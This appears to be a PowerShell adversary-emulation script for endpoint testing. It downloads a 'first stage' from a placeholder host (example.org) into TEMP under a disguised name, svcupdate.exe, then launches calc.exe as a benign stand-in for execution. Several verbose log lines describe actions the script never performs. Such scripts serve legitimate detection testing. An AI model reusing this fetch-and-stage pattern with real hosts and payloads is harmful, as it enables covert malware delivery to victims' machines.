<#
.SYNOPSIS
    Multi-stage download and handoff workflow.

.DESCRIPTION
    Downloads a first-stage script, verifies the drop path, then
    invokes a second-stage helper that performs the handoff.
    Both stages share the same bounded timeout and retry policy.

.NOTES
    Intended for controlled endpoint testing.
#>
[CmdletBinding()]
param(
    [string]$FetchUrl = 'http://example.org/stage1.ps1',
    [string]$OutputPath = "$env:TEMP\svcupdate.exe",
    [string]$ActivityLog = "$env:TEMP\report.txt",
    [int]$TimeoutSec = 39
)
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

# First stage
function Invoke-Stage1Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 39
    )

    Write-Verbose ("Downloading first stage from " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    if (-not (Test-Path -Path $DestinationPath)) {
        throw "First stage was not written to disk"
    }
    return $DownloadedPath = $DestinationPath
}

# Second stage
function Invoke-Stage2Execution {
    param(
        [string]$StagedPath = "",
        [int]$DelaySeconds = 2
    )

    Write-Verbose ("Preparing handoff for " + $StagedPath)
    Start-Sleep -Seconds $DelaySeconds
    Start-Process -FilePath "calc.exe"
    Write-Verbose "Second stage handoff complete"
    return $true
}

try {
    Write-Verbose "Starting multi-stage workflow"
    $TransferResult = Invoke-Stage1Download -SourceUrl $FetchUrl -DestinationPath $OutputPath -TimeoutSec $TimeoutSec
    if ($TransferResult) {
        $HandoffResult = Invoke-Stage2Execution -StagedPath $OutputPath
        Write-Verbose ("Handoff result: " + $HandoffResult)
    }
    else {
        Write-Warning "First stage did not complete"
    }
}
catch {
    Write-Warning "Multi-stage workflow failed: $($_.Exception.Message)"
}

$StageSummary = [ordered]@{
    Stage1 = "download"
    Stage2 = "handoff"
    Endpoint = $FetchUrl
    Destination = $OutputPath
    TimeoutSec = $TimeoutSec
}
$StageSummary | ConvertTo-Json -Depth 3 | Out-File -FilePath $ActivityLog -Append
Write-Verbose "Validating result"
Write-Verbose "Exporting operation report"
Write-Verbose "Applying operation timeout"
Write-Verbose "Starting workflow"
Write-Verbose "Inspecting process list"
Write-Verbose "Cleaning temporary marker"
Write-Verbose "Resolving configured target"
Write-Verbose "Retry budget remaining"
Write-Verbose "Reading configuration values"
Write-Verbose "Operation completed"
Write-Verbose "Collecting host metadata"
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
$ProgressPreference = "SilentlyContinue"
